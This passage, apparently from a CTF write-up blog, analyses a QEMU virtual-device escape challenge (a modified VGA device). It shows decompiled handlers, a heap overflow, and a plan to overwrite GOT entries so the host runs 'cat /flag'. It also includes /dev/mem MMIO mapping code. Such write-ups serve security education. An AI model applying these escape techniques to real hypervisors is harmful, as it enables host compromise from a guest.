class="line">15</span><br></pre></td><td class="code"><pre><span class="line">system( <span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span> );</span><br><span class="line"><span class="keyword">int</span> fd = open( <span class="string">&quot;/dev/mem&quot;</span>, O_RDWR | O_SYNC );</span><br><span class="line"><span class="keyword">if</span> ( fd == <span class="number">-1</span> ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mmio_mem = mmap( <span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0xfebc1000</span> );</span><br><span class="line"><span class="keyword">if</span> ( !mmio_mem ) &#123;</span><br><span class="line">    die(<span class="string">&quot;mmap mmio failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vga_mem = mmap( <span class="literal">NULL</span>, <span class="number">0x20000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0xa0000</span> );</span><br><span class="line"><span class="keyword">if</span> ( !vga_mem ) &#123;</span><br><span class="line">    die(<span class="string">&quot;mmap vga mem failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><p>根据上一道题的流程来看，这里需要分析分析结构体了。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315135737136.png"                      alt="image-20230315135737136"                ></p><p>在对比两个结构体的结果发现了源文件中不存在<code>VulnState_0 vs[16];uint32_t latch[4];</code>这样两个属性。并且还明显的说了是<code>VulnState_0</code>。通过源码对比发现，源码中考虑地址的情况只有<code>addr &lt; 0x10000</code>，<code>addr &gt;= 0x18000 &amp;&amp; addr &lt; 0x18100</code></p><p>但是这里存在一个新的，也就是大于<code>0x18100</code>的情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">v5 = opaque-&gt;vga.sr[<span class="number">0xCC</span>] % <span class="number">5u</span>;</span><br><span class="line"><span class="keyword">if</span> ( *(_WORD *)&amp;opaque-&gt;vga.sr[<span class="number">0xCD</span>] )</span><br><span class="line">  LODWORD(mem_value) = (opaque-&gt;vga.sr[<span class="number">0xCD</span>] &lt;&lt; <span class="number">16</span>) | (opaque-&gt;vga.sr[<span class="number">0xCE</span>] &lt;&lt; <span class="number">8</span>) | mem_value;</span><br><span class="line"><span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v21 = BYTE2(mem_value);</span><br><span class="line">  <span class="keyword">if</span> ( v21 &lt;= <span class="number">0x10</span> &amp;&amp; opaque-&gt;vs[v21].buf )</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">2u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE2(mem_value) &gt; <span class="number">0x10</span>uLL )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v6 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">      v7 = *((_QWORD *)v6 + <span class="number">0x267B</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v6 + <span class="number">0x4CF9</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 &gt;= *((_DWORD *)v6 + <span class="number">0x4CF8</span>) )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      LABEL_26:</span><br><span class="line">      *((_DWORD *)v6 + <span class="number">0x4CF9</span>) = v8 + <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(v7 + v8) = mem_value;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE2(mem_value) &gt; <span class="number">0x10</span>uLL )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v6 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">      v7 = *((_QWORD *)v6 + <span class="number">0x267B</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v6 + <span class="number">19705</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 &gt; <span class="number">0xFFF</span> )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">    &#125;</span><br><span class="line">    LABEL_35:</span><br><span class="line">    v17 = vulncnt;</span><br><span class="line">    <span class="keyword">if</span> ( vulncnt &lt;= <span class="number">0x10</span> &amp;&amp; (<span class="keyword">unsigned</span> __int16)mem_value &lt;= <span class="number">0x1000</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      mem_valuea = mem_value;</span><br><span class="line">      v18 = <span class="built_in">malloc</span>((<span class="keyword">unsigned</span> __int16)mem_value);</span><br><span class="line">      v19 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * v17;</span><br><span class="line">      *((_QWORD *)v19 + <span class="number">9851</span>) = v18;</span><br><span class="line">      <span class="keyword">if</span> ( v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        vulncnt = v17 + <span class="number">1</span>;</span><br><span class="line">        *((_DWORD *)v19 + <span class="number">19704</span>) = mem_valuea;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( BYTE2(mem_value) &lt;= <span class="number">0x10</span>uLL )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)v20 + <span class="number">9851</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)mem_value &lt;= <span class="number">0x1000</span>u )</span><br><span class="line">        *((_QWORD *)v20 + <span class="number">9852</span>) = (<span class="keyword">unsigned</span> __int16)mem_value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向之后会发现这里其实就是一个堆题，总共有五个选项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v5==<span class="number">0</span>时，opaque-&gt;vs[idx].buf = <span class="built_in">malloc</span>(mem_value &amp; <span class="number">0xfff</span>); max_size == mem_value &amp; <span class="number">0xfff</span></span><br><span class="line">v5==<span class="number">1</span>时，当cur_size &lt; max_size时，opaque-&gt;vs[idx].buf[cur_size++] = mem_value &amp; <span class="number">0xff</span></span><br><span class="line">v5==<span class="number">2</span>时，printf_chk(<span class="number">1</span>, opaque-&gt;vs[idx].buf)</span><br><span class="line">v5==<span class="number">3</span>时，opaque-&gt;vs[idx].max_size = mem_value &amp; <span class="number">0xfff</span></span><br><span class="line">v5==<span class="number">4</span>时，opaque-&gt;vs[idx].buf[cur_size++] = mem_value &amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure><p>需要吐槽的是，这两次汇编语言表达的意思一样但是表达的形式不一样，所以莫名其妙的需要依靠汇编来逆向。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000068F521 48 81 C2 3D 13 00 00          add     rdx, 133Dh</span><br><span class="line">.text:000000000068F528 48 C1 E2 04                   shl     rdx, 4</span><br><span class="line">.text:000000000068F52C 48 8B 74 13 08                mov     rsi, [s+rdx+8]</span><br><span class="line">.text:000000000068F531 48 85 F6                      test    rsi, rsi</span><br><span class="line">.text:000000000068F534 0F 84 24 FD FF FF             jz      loc_68F25E</span><br><span class="line">.text:000000000068F534</span><br><span class="line">.text:000000000068F53A 48 83 C4 18                   add     rsp, 18h</span><br><span class="line">.text:000000000068F53E BF 01 00 00 00                mov     edi, 1</span><br><span class="line">.text:000000000068F543 31 C0                         xor     eax, eax</span><br><span class="line">.text:000000000068F545 5B                            pop     s</span><br><span class="line">.text:000000000068F546 5D                            pop     rbp</span><br><span class="line">.text:000000000068F547 E9 F4 99 D7 FF                jmp     ___printf_chk</span><br><span class="line"></span><br><span class="line">······</span><br><span class="line"></span><br><span class="line">.text:000000000068F47B 48 89 E9                      mov     rcx, rbp</span><br><span class="line">.text:000000000068F47E 48 C1 E1 04                   shl     rcx, 4</span><br><span class="line">.text:000000000068F482 48 01 CB                      add     s, rcx</span><br><span class="line">.text:000000000068F485 48 85 C0                      test    rax, rax</span><br><span class="line">.text:000000000068F488 48 89 83 D8 33 01 00          mov     [rbx+133D8h], rax</span><br><span class="line">.text:000000000068F48F 0F 84 C9 FD FF FF             jz      loc_68F25E</span><br><span class="line">.text:000000000068F48F</span><br><span class="line">.text:000000000068F495 48 8B 54 24 08                mov     rdx, qword ptr [rsp+28h+chunk_size]</span><br><span class="line">.text:000000000068F49A 48 83 C5 01                   add     rbp, 1</span><br><span class="line">.text:000000000068F49E 48 89 2D 3B A0 A3 00          mov     cs:vulncnt, rbp</span><br><span class="line">.text:000000000068F4A5 81 E2 FF FF 00 00             and     edx, 0FFFFh</span><br><span class="line">.text:000000000068F4AB 89 93 E0 33 01 00             mov     [rbx+133E0h], edx</span><br><span class="line">.text:000000000068F4B1 E9 A8 FD FF FF                jmp     loc_68F25E</span><br></pre></td></tr></table></figure><p>上面可以看到漏洞点是<code>v5 == 4</code>时，对<code>cur_size</code>没有检测，可以实现堆溢出，当然我感觉三可以修改最大size配合二也是可以实现堆溢出，但是直接用四即可实现所以也没必要再去搞三二了。</p><p>再就是存在一个大的问题就是，上面所有对idx的验证就是小于等于16，所以这一出也就导致我们可以溢出到下一个成员<code>latch</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">cydf_vga_mem_read</span><span class="params">(CydfVGAState *opaque, hwaddr addr, <span class="keyword">uint32_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">bool</span> v4; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;latch[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !(_WORD)v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (opaque-&gt;vga.sr[<span class="number">7</span>] &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">    opaque-&gt;latch[<span class="number">0</span>] = addr | v3;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">    <span class="keyword">return</span> vga_mem_readb(&amp;opaque-&gt;vga, addr);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (opaque-&gt;vga.sr[<span class="number">7</span>] &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">  opaque-&gt;latch[<span class="number">0</span>] = (_DWORD)addr &lt;&lt; <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">return</span> vga_mem_readb(&amp;opaque-&gt;vga, addr);</span><br><span class="line">LABEL_3:</span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0xFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">255LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( addr - <span class="number">0x18000</span> &lt;= <span class="number">0xFF</span> &amp;&amp; (opaque-&gt;vga.sr[<span class="number">23</span>] &amp; <span class="number">0x44</span>) == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> cydf_mmio_blt_read(opaque, (<span class="keyword">unsigned</span> __int8)addr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFF</span>LL;</span><br><span class="line">    v6 = (<span class="keyword">char</span> *)opaque + <span class="number">4</span> * (addr &gt;&gt; <span class="number">15</span>);</span><br><span class="line">    v7 = addr &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; *((_DWORD *)v6 + <span class="number">0x44D5</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *((_DWORD *)v6 + <span class="number">0x44D3</span>) + v7;</span><br><span class="line">      <span class="keyword">if</span> ( (opaque-&gt;vga.gr[<span class="number">11</span>] &amp; <span class="number">0x14</span>) == <span class="number">20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 *= <span class="number">16</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( (opaque-&gt;vga.gr[<span class="number">11</span>] &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 *= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;vga.vram_ptr[opaque-&gt;cydf_addr_mask &amp; v8];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在这个函数中其实是可以控制<code>latch[0]</code>的值的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( (<span class="keyword">char</span>)sr_index )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    opaque-&gt;vga.sr[(<span class="keyword">unsigned</span> __int8)sr_index] = sr_mask[(<span class="keyword">unsigned</span> __int8)sr_index] &amp; v4;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)sr_index == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">    opaque-&gt;vga.sr[<span class="number">6</span>] = <span class="number">3</span> * ((v4 &amp; <span class="number">0x17</span>) == <span class="number">18</span>) + <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">    cydf_update_memory_access(opaque);</span><br><span class="line">    sr_index = opaque-&gt;vga.sr_index;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xB</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xD</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xE</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xF</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x15</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x16</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x18</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x19</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1A</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1B</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1C</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1D</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1E</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1F</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xCC</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xCD</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xCE</span>:</span><br><span class="line">    LABEL_28:</span><br><span class="line">    opaque-&gt;vga.sr[sr_index] = v4;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在这里我们正好可以控制<code>opaque-&gt;vga.sr[0xCC]</code>的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qemu_log</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v4; <span class="comment">// r8</span></span><br><span class="line">  __int64 v5; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">int</span> ret; <span class="comment">// [rsp+1Ch] [rbp-D4h]</span></span><br><span class="line">  gcc_va_list va; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-B8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+48h] [rbp-A8h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+50h] [rbp-A0h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+58h] [rbp-98h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+60h] [rbp-90h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+68h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  va_start(va, fmt);</span><br><span class="line">  v3 = va_arg(va, _QWORD);</span><br><span class="line">  v1 = va_arg(va, _QWORD);</span><br><span class="line">  v2 = va_arg(va, _QWORD);</span><br><span class="line">  v4 = va_arg(va, _QWORD);</span><br><span class="line">  v5 = va_arg(va, _QWORD);</span><br><span class="line">  va_end(va);</span><br><span class="line">  v10 = v3;</span><br><span class="line">  v11 = v1;</span><br><span class="line">  v12 = v2;</span><br><span class="line">  v13 = v4;</span><br><span class="line">  v14 = v5;</span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( qemu_logfile )</span><br><span class="line">  &#123;</span><br><span class="line">    va_start(va, fmt);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    ret = <span class="built_in">vfprintf</span>(qemu_logfile, fmt, va);</span><br><span class="line">    <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>qemu_log</code>函数中，存在一个<code>vfprintf</code>函数调用了bss上的一个变量<code>qemu_logfile</code>。那么利用思路如下：</p><ol><li>  修改qemu_logfile的内容为<code>cat /flag</code></li><li>  修改vfprintf函数的got表为system</li><li>  修改printf_chk函数的got表为qemu_log</li><li>  最后让v5等于2，触发printf_chk</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先吐槽一点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">switch ( addr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> 4uLL:</span><br><span class="line">  <span class="keyword">case</span> 0x24uLL:</span><br><span class="line">  opaque-&gt;vga.cr_index = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 5uLL:</span><br><span class="line">  <span class="keyword">case</span> 0x25uLL:</span><br><span class="line">  cr_index = opaque-&gt;vga.cr_index;</span><br><span class="line">  <span class="keyword">if</span> ( (unsigned __int8)cr_index &lt;= 0x18u )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> ( (opaque-&gt;vga.cr[17] &amp; 0x80u) == 0 || (unsigned __int8)cr_index &gt; 7u )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[(unsigned __int8)cr_index] = value;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)cr_index != 24 